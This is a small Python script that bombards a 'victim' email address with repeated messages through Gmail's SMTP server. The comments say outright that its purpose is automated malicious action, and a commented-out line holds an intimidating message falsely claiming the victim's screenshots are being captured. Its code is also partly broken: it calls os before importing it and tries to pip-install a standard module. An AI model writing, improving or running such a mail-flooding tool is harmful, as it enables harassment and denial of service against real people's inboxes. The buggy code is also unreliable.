#!usr/bin/python 
# script to send the emails from non interactive way ,---> main purpose is to perform the malicious action in automated manne ;;))/
try:
	import smtplib  # great smtp module to start the connection with the google's mail server diretly in non-interactive manner 
except:
	hide_cmd = os.system("pip install smtplib")
	
import os
import sys
server = smtplib.SMTP('smtp.gmail.com',587) # connecting with gmail smtp server with port number of 587 
    
server.starttls() # initialisong the tls handshake while connecting to the server
    

email     = input("Enter Your Email : ")
			# password  = getpass.getpass("Enter your Password:")
		
password = input("please enter your password ")

   # authentication check 
if not  email  and not password:
	print ("User not logged in")
else:
	server.login(email,password)
	print ("Successfully Signed in")
				# victim information 
	send = input("Please Enter Your Victim Email : ")

	print("Amount of bombarding messages?") 
				
	mailnumber= int(input("Count : "))  # counter of numnber of mail messeges to be sent 
				

	messagetovic = input("Enter Your Message :\n")
				
				

	for count in range(int(mailnumber)):
		server.sendmail("hello123@gmail.com" , send , messagetovic)			
		#print (count,"Your system screenshots are captured remotely and sent to me, daily!!!! :)! : ")


	server.quit()
		##	print("You have not Choosed 'gmail' ")			
# program ends 
# happy hacking 
# use carefully
